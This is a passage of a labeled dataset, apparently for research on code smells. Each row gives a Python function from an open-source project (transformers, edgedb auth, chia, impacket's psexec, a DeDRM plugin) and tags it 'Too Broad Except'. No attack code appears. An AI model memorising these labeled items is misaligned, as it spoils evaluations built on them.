                traced_model = torch.jit.trace(model, (input_ids, pixel_values))
            except RuntimeError:
                self.fail(""Couldn't trace module."")

            with tempfile.TemporaryDirectory() as tmp_dir_name:
                pt_file_name = os.path.join(tmp_dir_name, ""traced_model.pt"")

                try:
                    torch.jit.save(traced_model, pt_file_name)
                except Exception:
                    self.fail(""Couldn't save module."")

                try:
                    loaded_model = torch.jit.load(pt_file_name)
                except Exception:
                    self.fail(""Couldn't load module."")

            model.to(torch_device)
            model.eval()

            loaded_model.to(torch_device)
            loaded_model.eval()

            model_state_dict = model.state_dict()
            loaded_model_state_dict = loaded_model.state_dict()

            non_persistent_buffers = {}
            for key in loaded_model_state_dict.keys():
                if key not in model_state_dict.keys():
                    non_persistent_buffers[key] = loaded_model_state_dict[key]

            loaded_model_state_dict = {
                key: value for key, value in loaded_model_state_dict.items() if key not in non_persistent_buffers
            }

            self.assertEqual(set(model_state_dict.keys()), set(loaded_model_state_dict.keys()))

            models_equal = True
            for layer_name, p1 in model_state_dict.items():
                p2 = loaded_model_state_dict[layer_name]
                if p1.data.ne(p2.data).sum() > 0:
                    models_equal = False

            self.assertTrue(models_equal)",Too Broad Except,1
160,edgedb,/home/r4ph/desenv/phd/exception-miner/projects/py/edgedb/edb/server/multitenant.py,_create_tenant,"async def _create_tenant(self, conf: TenantConfig) -> edbtenant.Tenant:
        cluster = await pgcluster.get_remote_pg_cluster(
            conf[""backend-dsn""], tenant_id=conf.get(""tenant-id"")
        )
        instance_params = cluster.get_runtime_params().instance_params
        max_conns = (
            instance_params.max_connections
            - instance_params.reserved_connections
        )
        if ""max-backend-connections"" not in conf:
            logger.info(f""Detected {max_conns} backend connections available."")
            if self._testmode:
                max_conns = srvargs.adjust_testmode_max_connections(max_conns)
                logger.info(
                    f""Using max_backend_connections={max_conns} ""
                    f""under test mode.""
                )
        elif conf[""max-backend-connections""] > max_conns:
            raise server.StartupError(
                f""--max-backend-connections is too large for this backend; ""
                f""detected maximum available NUM: {max_conns}""
            )
        else:
            max_conns = conf[""max-backend-connections""]

        conn_params = cluster.get_connection_params()
        conn_params = dataclasses.replace(
            conn_params,
            server_settings={
                **conn_params.server_settings,
                ""application_name"": f'edgedb_instance_{conf[""instance-name""]}',
                ""edgedb.instance_name"": conf[""instance-name""],
                ""edgedb.server_version"": buildmeta.get_version_json(),
            },
        )
        cluster.set_connection_params(conn_params)

        if ""jwt-sub-allowlist-file"" in conf:
            jwt_sub_allowlist_file = pathlib.Path(
                conf[""jwt-sub-allowlist-file""]
            )
        else:
            jwt_sub_allowlist_file = None
        if ""jwt-revocation-list-file"" in conf:
            jwt_revocation_list_file = pathlib.Path(
                conf[""jwt-revocation-list-file""]
            )
        else:
            jwt_revocation_list_file = None
        tenant = edbtenant.Tenant(
            cluster,
            instance_name=conf[""instance-name""],
            max_backend_connections=max_conns,
            backend_adaptive_ha=conf.get(""backend-adaptive-ha"", False),
            readiness_state_file=conf.get(""readiness-state-file""),
            jwt_sub_allowlist_file=jwt_sub_allowlist_file,
            jwt_revocation_list_file=jwt_revocation_list_file,
        )
        tenant.set_server(self)
        tenant.load_jwcrypto()
        try:
            await tenant.init_sys_pgcon()
            await tenant.init()
            await tenant.start_accepting_new_tasks()
            tenant.start_running()

            if conf.get(""admin"", False):
                # There can be only one ""admin"" tenant, the behavior of setting
                # multiple tenants with `""admin"": true` is undefined.
                self._admin_tenant = tenant

            return tenant
        except Exception:
            await self._destroy_tenant(tenant)
            raise",Too Broad Except,1
161,dedrm,/home/r4ph/desenv/phd/exception-miner/projects/py/dedrm_tools/DeDRM_plugin/ignoblepdf.py,decrypt,"def decrypt(self):
            keypath = self.keypath.get()
            inpath = self.inpath.get()
            outpath = self.outpath.get()
            if not keypath or not os.path.exists(keypath):
                self.status['text'] = ""Specified key file does not exist""
                return
            if not inpath or not os.path.exists(inpath):
                self.status['text'] = ""Specified input file does not exist""
                return
            if not outpath:
                self.status['text'] = ""Output file not specified""
                return
            if inpath == outpath:
                self.status['text'] = ""Must have different input and output files""
                return
            userkey = open(keypath,'rb').read()
            self.status['text'] = ""Decrypting...""
            try:
                decrypt_status = decryptBook(userkey, inpath, outpath)
            except Exception as e:
                self.status['text'] = ""Error; {0}"".format(e.args[0])
                return
            if decrypt_status == 0:
                self.status['text'] = ""File successfully decrypted""
            else:
                self.status['text'] = ""The was an error decrypting the file.""",Too Broad Except,1
162,edgedb,/home/r4ph/desenv/phd/exception-miner/projects/py/edgedb/edb/server/protocol/auth_ext/http.py,handle_request,"async def handle_request(
        self, request: Any, response: Any, args: list[str]
    ):
        if self.db.db_config is None:
            await self.db.introspection()

        test_url = (
            request.params[b'oauth-test-server'].decode()
            if (
                self.test_mode
                and request.params
                and b'oauth-test-server' in request.params
            )
            else None
        )

        try:
            match args:
                case (""authorize"",):
                    query = urllib.parse.parse_qs(
                        request.url.query.decode(""ascii"")
                    )
                    provider_name = _get_search_param(query, ""provider"")
                    redirect_to = _get_search_param(query, ""redirect_to"")
                    redirect_to_on_signup = _maybe_get_search_param(
                        query, ""redirect_to_on_signup""
                    )
                    challenge = _get_search_param(query, ""challenge"")
                    oauth_client = oauth.Client(
                        db=self.db,
                        provider_name=provider_name,
                        base_url=test_url
                    )
                    await pkce.create(self.db, challenge)
                    authorize_url = await oauth_client.get_authorize_url(
                        redirect_uri=self._get_callback_url(),
                        state=self._make_state_claims(
                            provider_name, redirect_to,
                            redirect_to_on_signup, challenge
                        ),
                    )
                    response.status = http.HTTPStatus.FOUND
                    response.custom_headers[""Location""] = authorize_url

                case (""callback"",):
                    if request.method == b""POST"" and (
                        request.content_type
                        == b""application/x-www-form-urlencoded""
                    ):
                        form_data = urllib.parse.parse_qs(request.body.decode())
                        state = _maybe_get_form_field(form_data, ""state"")
                        code = _maybe_get_form_field(form_data, ""code"")

                        error = _maybe_get_form_field(form_data, ""error"")
                        error_description = _maybe_get_form_field(
                            form_data, ""error_description""
                        )
                    elif request.url.query is not None:
                        query = urllib.parse.parse_qs(
                            request.url.query.decode(""ascii"")
                        )
                        state = _maybe_get_search_param(query, ""state"")
                        code = _maybe_get_search_param(query, ""code"")
                        error = _maybe_get_search_param(query, ""error"")
                        error_description = _maybe_get_search_param(
                            query, ""error_description""
                        )
                    else:
                        raise errors.OAuthProviderFailure(
                            ""Provider did not respond with expected data""
                        )

                    if state is None:
                        raise errors.InvalidData(
                            ""Provider did not include the 'state' parameter in ""
                            ""callback""
                        )

                    if error is not None:
                        try:
                            claims = self._verify_and_extract_claims(state)
                            redirect_to = claims[""redirect_to""]
                        except Exception:
                            raise errors.InvalidData(""Invalid state token"")

                        params = {
                            ""error"": error,
                        }
                        if error_description is not None:
                            params[""error_description""] = error_description
                        response.custom_headers[
                            ""Location""
                        ] = f""{redirect_to}?{urllib.parse.urlencode(params)}""
                        response.status = http.HTTPStatus.FOUND
                        return

                    if code is None:
                        raise errors.InvalidData(
                            ""Provider did not include the 'code' parameter in ""
                            ""callback""
                        )

                    try:
                        claims = self._verify_and_extract_claims(state)
                        provider_name = claims[""provider""]
                        redirect_to = claims[""redirect_to""]
                        redirect_to_on_signup = claims.get(
                            ""redirect_to_on_signup""
                        )
                        challenge = claims[""challenge""]
                    except Exception:
                        raise errors.InvalidData(""Invalid state token"")
                    oauth_client = oauth.Client(
                        db=self.db,
                        provider_name=provider_name,
                        base_url=test_url,
                    )
                    (
                        identity,
                        new_identity,
                        auth_token,
                        refresh_token,
                    ) = await oauth_client.handle_callback(
                        code, self._get_callback_url()
                    )
                    pkce_code = await pkce.link_identity_challenge(
                        self.db, identity.id, challenge
                    )
                    if auth_token or refresh_token:
                        await pkce.add_provider_tokens(
                            self.db,
                            id=pkce_code,
                            auth_token=auth_token,
                            refresh_token=refresh_token,
                        )
                    parsed_url = urllib.parse.urlparse(
                        (redirect_to_on_signup or redirect_to)
                        if new_identity else redirect_to
                    )
                    query_params = urllib.parse.parse_qs(parsed_url.query)
                    query_params[""code""] = [pkce_code]
                    new_query = urllib.parse.urlencode(query_params, doseq=True)
                    new_url = parsed_url._replace(query=new_query).geturl()

                    session_token = self._make_session_token(identity.id)
                    response.status = http.HTTPStatus.FOUND
                    response.custom_headers[""Location""] = new_url
                    _set_cookie(response, ""edgedb-session"", session_token)

                case (""token"",):
                    query = urllib.parse.parse_qs(
                        request.url.query.decode(""ascii"")
                    )
                    code = _get_search_param(query, ""code"")
                    verifier = _get_search_param(query, ""verifier"")

                    verifier_size = len(verifier)

                    if verifier_size < 43:
                        raise errors.InvalidData(
                            ""Verifier must be at least 43 characters long""
                        )
                    if verifier_size > 128:
                        raise errors.InvalidData(
                            ""Verifier must be shorter than 128 ""
                            ""characters long""
                        )
                    try:
                        pkce_object = await pkce.get_by_id(self.db, code)
                    except Exception:
                        raise errors.NoIdentityFound(
                            ""Could not find a matching PKCE code""
                        )

                    if pkce_object.identity_id is None:
                        raise errors.InvalidData(
                            ""Code is not associated with an Identity""
                        )

                    hashed_verifier = hashlib.sha256(verifier.encode()).digest()
                    base64_url_encoded_verifier = base64.urlsafe_b64encode(
                        hashed_verifier
                    ).rstrip(b'=')

                    if (
                        base64_url_encoded_verifier.decode()
                        == pkce_object.challenge
                    ):
                        await pkce.delete(self.db, code)
                        session_token = self._make_session_token(
                            pkce_object.identity_id
                        )
                        response.status = http.HTTPStatus.OK
                        response.content_type = b""application/json""
                        response.body = json.dumps(
                            {
                                ""auth_token"": session_token,
                                ""identity_id"": pkce_object.identity_id,
                                ""provider_token"": pkce_object.auth_token,
                                ""provider_refresh_token"": (
                                    pkce_object.refresh_token
                                ),
                            }
                        ).encode()
                    else:
                        response.status = http.HTTPStatus.FORBIDDEN

                case (""register"",):
                    data = self._get_data_from_request(request)

                    register_provider_name = data.get(""provider"")
                    if register_provider_name is None:
                        raise errors.InvalidData(
                            'Missing ""provider"" in register request'
                        )
                    maybe_challenge = data.get(""challenge"")
                    if maybe_challenge is None:
                        raise errors.InvalidData(
                            'Missing ""challenge"" in register request'
                        )
                    await pkce.create(self.db, maybe_challenge)

                    local_client = local.Client(
                        db=self.db, provider_name=register_provider_name
                    )
                    try:
                        identity = await local_client.register(data)
                        pkce_code = await pkce.link_identity_challenge(
                            self.db, identity.id, maybe_challenge
                        )
                        if data.get(""redirect_to"") is not None:
                            response.status = http.HTTPStatus.FOUND
                            redirect_params = urllib.parse.urlencode(
                                {
                                    ""code"": pkce_code,
                                }
                            )
                            redirect_url = (
                                f""{data['redirect_to']}?{redirect_params}""
                            )
                            response.custom_headers[""Location""] = redirect_url
                        else:
                            response.status = http.HTTPStatus.CREATED
                            response.content_type = b""application/json""
                            response.body = json.dumps(
                                {
                                    ""code"": pkce_code
                                }
                            ).encode()
                    except Exception as ex:
                        redirect_on_failure = data.get(
                            ""redirect_on_failure"", data.get(""redirect_to"")
                        )
                        if redirect_on_failure is not None:
                            response.status = http.HTTPStatus.FOUND
                            redirect_params = urllib.parse.urlencode(
                                {
                                    ""error"": str(ex),
                                    ""email"": data.get('email', '')
                                }
                            )
                            redirect_url = (
                                f""{redirect_on_failure}?{redirect_params}""
                            )
                            response.custom_headers[""Location""] = redirect_url
                        else:
                            raise ex

                case (""authenticate"",):
                    data = self._get_data_from_request(request)

                    authenticate_provider_name = data.get(""provider"")
                    if authenticate_provider_name is None:
                        raise errors.InvalidData(
                            'Missing ""provider"" in register request'
                        )
                    maybe_challenge = data.get(""challenge"")
                    if maybe_challenge is None:
                        raise errors.InvalidData(
                            'Missing ""challenge"" in register request'
                        )
                    await pkce.create(self.db, maybe_challenge)

                    local_client = local.Client(
                        db=self.db, provider_name=authenticate_provider_name
                    )
                    try:
                        identity = await local_client.authenticate(data)

                        pkce_code = await pkce.link_identity_challenge(
                            self.db, identity.id, maybe_challenge
                        )
                        session_token = self._make_session_token(identity.id)
                        _set_cookie(response, ""edgedb-session"", session_token)
                        if data.get(""redirect_to"") is not None:
                            response.status = http.HTTPStatus.FOUND
                            redirect_params = urllib.parse.urlencode(
                                {
                                    ""code"": pkce_code,
                                }
                            )
                            redirect_url = (
                                f""{data['redirect_to']}?{redirect_params}""
                            )
                            response.custom_headers[""Location""] = redirect_url
                        else:
                            response.status = http.HTTPStatus.OK
                            response.content_type = b""application/json""
                            response.body = json.dumps(
                                {
                                    ""code"": pkce_code,
                                }
                            ).encode()
                    except Exception as ex:
                        redirect_on_failure = data.get(
                            ""redirect_on_failure"", data.get(""redirect_to"")
                        )
                        if redirect_on_failure is not None:
                            response.status = http.HTTPStatus.FOUND
                            redirect_params = urllib.parse.urlencode(
                                {
                                    ""error"": str(ex),
                                    ""email"": data.get('email', ''),
                                }
                            )
                            redirect_url = (
                                f""{redirect_on_failure}?{redirect_params}""
                            )
                            response.custom_headers[""Location""] = redirect_url
                        else:
                            raise ex

                case ('send_reset_email', ):
                    data = self._get_data_from_request(request)

                    local_provider_name = data.get(""provider"")
                    if local_provider_name is None:
                        raise errors.InvalidData(
                            'Missing ""provider"" in register request'
                        )

                    local_client = local.Client(
                        db=self.db, provider_name=local_provider_name
                    )

                    try:
                        if 'reset_url' not in data:
                            raise errors.InvalidData(
                                ""Missing 'reset_url' in data""
                            )

                        identity, secret = (
                            await local_client.get_identity_and_secret(data))

                        new_reset_token = self._make_reset_token(
                            identity.id, secret
                        )

                        reset_token_params = urllib.parse.urlencode({
                            ""reset_token"": new_reset_token
                        })
                        reset_url = f""{data['reset_url']}?{reset_token_params}""

                        from_addr = util.get_config(
                            self.db,
                            ""ext::auth::SMTPConfig::sender"",
                        )
                        ui_config = self._get_ui_config()
                        if ui_config is None:
                            email_args = {}
                        else:
                            email_args = dict(
                                app_name=ui_config.app_name,
                                logo_url=ui_config.logo_url,
                                dark_logo_url=ui_config.dark_logo_url,
                                brand_color=ui_config.brand_color,
                            )
                        msg = ui.render_password_reset_email(
                            from_addr=from_addr,
                            to_addr=data[""email""],
                            reset_url=reset_url,
                            **email_args,
                        )
                        coro = smtp.send_email(
                            self.db,
                            msg,
                            sender=from_addr,
                            recipients=data[""email""],
                            test_mode=self.test_mode,
                        )
                        task = self.tenant.create_task(
                            coro, interruptable=False
                        )
                        # Prevent timing attack
                        await asyncio.sleep(random.random() * 0.5)
                        # Expose e.g. configuration errors
                        if task.done():
                            await task

                        return_data = (
                            {
                                ""email_sent"": data.get('email'),
                            }
                        )

                        if data.get(""redirect_to"") is not None:
                            response.status = http.HTTPStatus.FOUND
                            redirect_params = urllib.parse.urlencode(
                                return_data
                            )
                            redirect_url = (
                                f""{data['redirect_to']}?{redirect_params}""
                            )
                            response.custom_headers[""Location""] = redirect_url
                        else:
                            response.status = http.HTTPStatus.OK
                            response.content_type = b""application/json""
                            response.body = json.dumps(
                                return_data
                            ).encode()
                    except aiosmtplib.SMTPException as ex:
                        if not debug.flags.server:
                            logger.warning(
                                ""Failed to send emails via SMTP"", exc_info=True
                            )
                        raise edb_errors.InternalServerError(
                            ""Failed to send the email, please try again later.""
                        ) from ex

                    except Exception as ex:
                        redirect_on_failure = data.get(
                            ""redirect_on_failure"", data.get(""redirect_to"")
                        )
                        if redirect_on_failure is not None:
                            response.status = http.HTTPStatus.FOUND
                            redirect_params = urllib.parse.urlencode(
                                {
                                    ""error"": str(ex),
                                    ""email"": data.get('email', ''),
                                }
                            )
                            redirect_url = (
                                f""{redirect_on_failure}?{redirect_params}""
                            )
                            response.custom_headers[""Location""] = redirect_url
                        else:
                            raise ex

                case ('reset_password',):
                    data = self._get_data_from_request(request)

                    local_provider_name = data.get(""provider"")
                    if local_provider_name is None:
                        raise errors.InvalidData(
                            'Missing ""provider"" in register request'
                        )

                    local_client = local.Client(
                        db=self.db, provider_name=local_provider_name
                    )

                    try:
                        if 'reset_token' not in data:
                            raise errors.InvalidData(
                                ""Missing 'reset_token' in data""
                            )
                        reset_token = data['reset_token']

                        identity_id, secret = (
                            self._get_data_from_reset_token(reset_token)
                        )

                        identity = await local_client.update_password(
                            identity_id, secret, data
                        )

                        session_token = self._make_session_token(identity.id)
                        _set_cookie(response, ""edgedb-session"", session_token)
                        if data.get(""redirect_to"") is not None:
                            response.status = http.HTTPStatus.FOUND
                            redirect_params = urllib.parse.urlencode(
                                {
                                    ""identity_id"": identity.id,
                                    ""auth_token"": session_token,
                                }
                            )
                            redirect_url = (
                                f""{data['redirect_to']}?{redirect_params}""
                            )
                            response.custom_headers[""Location""] = redirect_url
                        else:
                            response.status = http.HTTPStatus.OK
                            response.content_type = b""application/json""
                            response.body = json.dumps(
                                {
                                    ""identity_id"": identity.id,
                                    ""auth_token"": session_token,
                                }
                            ).encode()
                    except Exception as ex:
                        redirect_on_failure = data.get(
                            ""redirect_on_failure"", data.get(""redirect_to"")
                        )
                        if redirect_on_failure is not None:
                            response.status = http.HTTPStatus.FOUND
                            redirect_params = urllib.parse.urlencode(
                                {
                                    ""error"": str(ex),
                                    ""reset_token"": data.get('reset_token', ''),
                                }
                            )
                            redirect_url = (
                                f""{redirect_on_failure}?{redirect_params}""
                            )
                            response.custom_headers[""Location""] = redirect_url
                        else:
                            raise ex

                case ('ui', 'signin'):
                    ui_config = self._get_ui_config()

                    if ui_config is None:
                        response.status = http.HTTPStatus.NOT_FOUND
                        response.body = b'Auth UI not enabled'
                    else:
                        providers = util.maybe_get_config(
                            self.db,
                            ""ext::auth::AuthConfig::providers"",
                            frozenset
                        )
                        if providers is None or len(providers) == 0:
                            raise errors.MissingConfiguration(
                                'ext::auth::AuthConfig::providers',
                                'No providers are configured'
                            )

                        query = urllib.parse.parse_qs(
                            request.url.query.decode(""ascii"")
                            if request.url.query
                            else ''
                        )

                        maybe_challenge = _get_pkce_challenge(
                            response=response,
                            cookies=request.cookies,
                            query_dict=query,
                        )
                        if maybe_challenge is None:
                            raise errors.InvalidData(
                                'Missing ""challenge"" in register request'
                            )

                        response.status = http.HTTPStatus.OK
                        response.content_type = b'text/html'
                        response.body = ui.render_login_page(
                            base_path=self.base_path,
                            providers=providers,
                            redirect_to=ui_config.redirect_to,
                            error_message=_maybe_get_search_param(
                                query, 'error'
                            ),
                            email=_maybe_get_search_param(query, 'email'),
                            challenge=maybe_challenge,
                            app_name=ui_config.app_name,
                            logo_url=ui_config.logo_url,
                            dark_logo_url=ui_config.dark_logo_url,
                            brand_color=ui_config.brand_color,
                        )

                case ('ui', 'signup'):
                    ui_config = self._get_ui_config()
                    if ui_config is None:
                        response.status = http.HTTPStatus.NOT_FOUND
                        response.body = b'Auth UI not enabled'
                    else:
                        providers = util.maybe_get_config(
                            self.db,
                            ""ext::auth::AuthConfig::providers"",
                            frozenset
                        )
                        if providers is None or len(providers) == 0:
                            raise errors.MissingConfiguration(
                                'ext::auth::AuthConfig::providers',
                                'No providers are configured'
                            )

                        query = urllib.parse.parse_qs(
                            request.url.query.decode(""ascii"")
                            if request.url.query
                            else ''
                        )

                        maybe_challenge = _get_pkce_challenge(
                            response=response,
                            cookies=request.cookies,
                            query_dict=query,
                        )
                        if maybe_challenge is None:
                            raise errors.InvalidData(
                                'Missing ""challenge"" in register request'
                            )

                        response.status = http.HTTPStatus.OK
                        response.content_type = b'text/html'
                        response.body = ui.render_signup_page(
                            base_path=self.base_path,
                            providers=providers,
                            redirect_to=(
                                ui_config.redirect_to_on_signup
                                or ui_config.redirect_to
                            ),
                            error_message=_maybe_get_search_param(
                                query, 'error'
                            ),
                            email=_maybe_get_search_param(query, 'email'),
                            challenge=maybe_challenge,
                            app_name=ui_config.app_name,
                            logo_url=ui_config.logo_url,
                            dark_logo_url=ui_config.dark_logo_url,
                            brand_color=ui_config.brand_color,
                        )

                case ('ui', 'forgot-password'):
                    ui_config = self._get_ui_config()
                    password_provider = (
                        self._get_password_provider()
                        if ui_config is not None
                        else None
                    )

                    if ui_config is None or password_provider is None:
                        response.status = http.HTTPStatus.NOT_FOUND
                        response.body = (
                            b'Password provider not configured'
                            if ui_config else b'Auth UI not enabled'
                        )
                    else:
                        query = urllib.parse.parse_qs(
                            request.url.query.decode(""ascii"")
                            if request.url.query
                            else ''
                        )

                        response.status = http.HTTPStatus.OK
                        response.content_type = b'text/html'
                        response.body = ui.render_forgot_password_page(
                            base_path=self.base_path,
                            provider_name=password_provider.name,
                            error_message=_maybe_get_search_param(
                                query, 'error'
                            ),
                            email=_maybe_get_search_param(query, 'email'),
                            email_sent=_maybe_get_search_param(
                                query, 'email_sent'
                            ),
                            app_name=ui_config.app_name,
                            logo_url=ui_config.logo_url,
                            dark_logo_url=ui_config.dark_logo_url,
                            brand_color=ui_config.brand_color,
                        )

                case ('ui', 'reset-password'):
                    ui_config = self._get_ui_config()
                    password_provider = (
                        self._get_password_provider()
                        if ui_config is not None
                        else None
                    )

                    if ui_config is None or password_provider is None:
                        response.status = http.HTTPStatus.NOT_FOUND
                        response.body = (
                            b'Password provider not configured'
                            if ui_config else b'Auth UI not enabled'
                        )
                    else:
                        query = urllib.parse.parse_qs(
                            request.url.query.decode(""ascii"")
                            if request.url.query
                            else ''
                        )

                        reset_token = _maybe_get_search_param(
                            query, 'reset_token')

                        if reset_token is not None:
                            try:
                                identity_id, secret = (
                                    self._get_data_from_reset_token(
                                        reset_token
                                    )
                                )

                                local_client = local.Client(
                                    db=self.db,
                                    provider_name=password_provider.name
                                )

                                is_valid = await (
                                    local_client.validate_reset_secret(
                                        identity_id, secret
                                    )
                                )
                            except Exception:
                                is_valid = False
                        else:
                            is_valid = False

                        response.status = http.HTTPStatus.OK
                        response.content_type = b'text/html'
                        response.body = ui.render_reset_password_page(
                            base_path=self.base_path,
                            provider_name=password_provider.name,
                            is_valid=is_valid,
                            redirect_to=ui_config.redirect_to,
                            reset_token=reset_token,
                            error_message=_maybe_get_search_param(
                                query, 'error'
                            ),
                            app_name=ui_config.app_name,
                            logo_url=ui_config.logo_url,
                            dark_logo_url=ui_config.dark_logo_url,
                            brand_color=ui_config.brand_color,
                        )

                case ('ui', '_static', filename):
                    filepath = os.path.join(
                        os.path.dirname(__file__),
                        '_static', filename
                    )
                    try:
                        with open(filepath, 'rb') as f:
                            response.status = http.HTTPStatus.OK
                            response.content_type = (
                                mimetypes.guess_type(filename)[0]
                                or 'application/octet-stream'
                            ).encode()
                            response.body = f.read()
                    except FileNotFoundError:
                        response.status = http.HTTPStatus.NOT_FOUND

                case _:
                    raise errors.NotFound(""Unknown auth endpoint"")

        except errors.NotFound as ex:
            _fail_with_error(
                response=response,
                status=http.HTTPStatus.NOT_FOUND,
                message=str(ex),
                ex_type=edb_errors.ProtocolError,
            )

        except errors.InvalidData as ex:
            markup.dump(ex)
            _fail_with_error(
                response=response,
                status=http.HTTPStatus.BAD_REQUEST,
                message=str(ex),
                ex_type=edb_errors.ProtocolError,
            )

        except errors.MissingConfiguration as ex:
            _fail_with_error(
                response=response,
                status=http.HTTPStatus.INTERNAL_SERVER_ERROR,
                message=str(ex),
                ex_type=edb_errors.ProtocolError,
            )

        except errors.NoIdentityFound:
            _fail_with_error(
                response=response,
                status=http.HTTPStatus.FORBIDDEN,
                message=""No identity found"",
                ex_type=edb_errors.ProtocolError,
            )

        except errors.UserAlreadyRegistered as ex:
            _fail_with_error(
                response=response,
                status=http.HTTPStatus.CONFLICT,
                message=str(ex),
                ex_type=edb_errors.ProtocolError,
            )

        except Exception as ex:
            if debug.flags.server:
                markup.dump(ex)
            _fail_with_error(
                response=response,
                status=http.HTTPStatus.INTERNAL_SERVER_ERROR,
                message=str(ex),
                ex_type=edb_errors.InternalServerError,
            )",Too Broad Except,1
163,impacket,/home/r4ph/desenv/phd/exception-miner/projects/py/impacket/examples/psexec.py,do_lget,"def do_lget(self, src_path):
        try:
            if self.transferClient is None:
                self.connect_transferClient()

            import ntpath
            filename = ntpath.basename(src_path)
            fh = open(filename,'wb')
            logging.info(""Downloading %s\\%s"" % (self.share, src_path))
            self.transferClient.getFile(self.share, src_path, fh.write)
            fh.close()
        except Exception as e:
            logging.critical(str(e))
            pass

        self.send_data('\r\n')",Too Broad Except,1
164,chia-blockchain,/home/r4ph/desenv/phd/exception-miner/projects/py/chia-blockchain/chia/full_node/full_node.py,sync_from_fork_point,"async def sync_from_fork_point(
        self,
        fork_point_height: uint32,
        target_peak_sb_height: uint32,
        peak_hash: bytes32,
        summaries: List[SubEpochSummary],
    ) -> None:
        buffer_size = 4
        self.log.info(f""Start syncing from fork point at {fork_point_height} up to {target_peak_sb_height}"")
        peers_with_peak: List[WSChiaConnection] = self.get_peers_with_peak(peak_hash)
        fork_point_height = await check_fork_next_block(
            self.blockchain, fork_point_height, peers_with_peak, node_next_block_check
        )
        batch_size = self.constants.MAX_BLOCK_COUNT_PER_REQUESTS

        async def fetch_block_batches(
            batch_queue: asyncio.Queue[Optional[Tuple[WSChiaConnection, List[FullBlock]]]]
        ) -> None:
            start_height, end_height = 0, 0
            new_peers_with_peak: List[WSChiaConnection] = peers_with_peak[:]
            try:
                for start_height in range(fork_point_height, target_peak_sb_height, batch_size):
                    end_height = min(target_peak_sb_height, start_height + batch_size)
                    request = RequestBlocks(uint32(start_height), uint32(end_height), True)
                    fetched = False
                    for peer in random.sample(new_peers_with_peak, len(new_peers_with_peak)):
                        if peer.closed:
                            continue
                        response = await peer.call_api(FullNodeAPI.request_blocks, request, timeout=30)
                        if response is None:
                            await peer.close()
                        elif isinstance(response, RespondBlocks):
                            await batch_queue.put((peer, response.blocks))
                            fetched = True
                            break
                    if fetched is False:
                        self.log.error(f""failed fetching {start_height} to {end_height} from peers"")
                        return
                    if self.sync_store.peers_changed.is_set():
                        new_peers_with_peak = self.get_peers_with_peak(peak_hash)
                        self.sync_store.peers_changed.clear()
            except Exception as e:
                self.log.error(f""Exception fetching {start_height} to {end_height} from peer {e}"")
            finally:
                # finished signal with None
                await batch_queue.put(None)

        async def validate_block_batches(
            inner_batch_queue: asyncio.Queue[Optional[Tuple[WSChiaConnection, List[FullBlock]]]]
        ) -> None:
            advanced_peak: bool = False
            while True:
                res: Optional[Tuple[WSChiaConnection, List[FullBlock]]] = await inner_batch_queue.get()
                if res is None:
                    self.log.debug(""done fetching blocks"")
                    return None
                peer, blocks = res
                start_height = blocks[0].height
                end_height = blocks[-1].height
                success, state_change_summary, err = await self.add_block_batch(
                    blocks, peer, None if advanced_peak else uint32(fork_point_height), summaries
                )
                if success is False:
                    await peer.close(600)
                    # check CHIP-0013 exception
                    if err == Err.CHIP_0013_VALIDATION:
                        self.add_to_bad_peak_cache(peak_hash, target_peak_sb_height)
                        raise ValidationError(err, f""Failed to validate block batch {start_height} to {end_height}"")
                    raise ValueError(f""Failed to validate block batch {start_height} to {end_height}"")
                self.log.info(f""Added blocks {start_height} to {end_height}"")
                peak: Optional[BlockRecord] = self.blockchain.get_peak()
                if state_change_summary is not None:
                    advanced_peak = True
                    assert peak is not None
                    # Hints must be added to the DB. The other post-processing tasks are not required when syncing
                    hints_to_add, _ = get_hints_and_subscription_coin_ids(
                        state_change_summary,
                        self.subscriptions.has_coin_subscription,
                        self.subscriptions.has_ph_subscription,
                    )
                    await self.hint_store.add_hints(hints_to_add)
                self.blockchain.clean_block_record(end_height - self.constants.BLOCKS_CACHE_SIZE)

        batch_queue_input: asyncio.Queue[Optional[Tuple[WSChiaConnection, List[FullBlock]]]] = asyncio.Queue(
            maxsize=buffer_size
        )
        fetch_task = asyncio.Task(fetch_block_batches(batch_queue_input))
        validate_task = asyncio.Task(validate_block_batches(batch_queue_input))
        try:
            with log_exceptions(log=self.log, message=""sync from fork point failed""):
                await asyncio.gather(fetch_task, validate_task)
        except Exception:
            assert validate_task.done()
            fetch_task.cancel()",Too Broad Except,1
165,quantaxis,/home/r4ph/desenv/phd/exception-miner/projects/py/quantaxis/QUANTAXIS/QASU/save_tushare.py,saving_work,"def saving_work(i):
        QA_util_log_info('Now Saving ==== %s' % (i))
        try:
            data_json = QA_fetch_get_stock_day(i, start='1990-01-01')

            __coll.insert_many(data_json)
        except Exception as e:
            print(e)
            QA_util_log_info('error in saving ==== %s' % str(i))",Too Broad Except,1
166,transformers,/home/r4ph/desenv/exception-miner/projects/py/transformers/examples/research_projects/seq2seq-distillation/convert_pl_checkpoint_to_hf.py,convert_pl_to_hf,"def convert_pl_to_hf(pl_ckpt_path: str, hf_src_model_dir: str, save_path: str) -> None:
    """"""Cleanup a pytorch-lightning .ckpt file or experiment dir and save a huggingface model with that state dict.
    Silently allows extra pl keys (like teacher.) Puts all ckpt models into CPU RAM at once!

    Args:
        pl_ckpt_path (:obj:`str`): Path to a .ckpt file saved by pytorch_lightning or dir containing ckpt files.
            If a directory is passed, all .ckpt files inside it will be averaged!
        hf_src_model_dir (:obj:`str`): Path to a directory containing a correctly shaped checkpoint
        save_path (:obj:`str`): Directory to save the new model

    """"""
    hf_model = AutoModelForSeq2SeqLM.from_pretrained(hf_src_model_dir)
    if os.path.isfile(pl_ckpt_path):
        ckpt_files = [pl_ckpt_path]
    else:
        assert os.path.isdir(pl_ckpt_path)
        ckpt_files = list(Path(pl_ckpt_path).glob(""*.ckpt""))
        assert ckpt_files, f""could not find any ckpt files inside the {pl_ckpt_path} directory""

    if len(ckpt_files) > 1:
        logger.info(f""averaging the weights of {ckpt_files}"")

    state_dicts = [sanitize(torch.load(x, map_location=""cpu"")[""state_dict""]) for x in ckpt_files]
    state_dict = average_state_dicts(state_dicts)

    missing, unexpected = hf_model.load_state_dict(state_dict, strict=False)
    assert not missing, f""missing keys: {missing}""
    hf_model.save_pretrained(save_path)
    try:
        tok = AutoTokenizer.from_pretrained(hf_src_model_dir)
        tok.save_pretrained(save_path)
    except Exception:
        pass
        # dont copy tokenizer if cant",Too Broad Except,1
167,spyder,/home/r4ph/desenv/phd/exception-miner/projects/py/spyder/spyder/utils/workers.py,terminate,"def terminate(self):
        """"""Terminate running processes.""""""
        self._timer.stop()
        if self._process.state() == QProcess.Running:
            try:
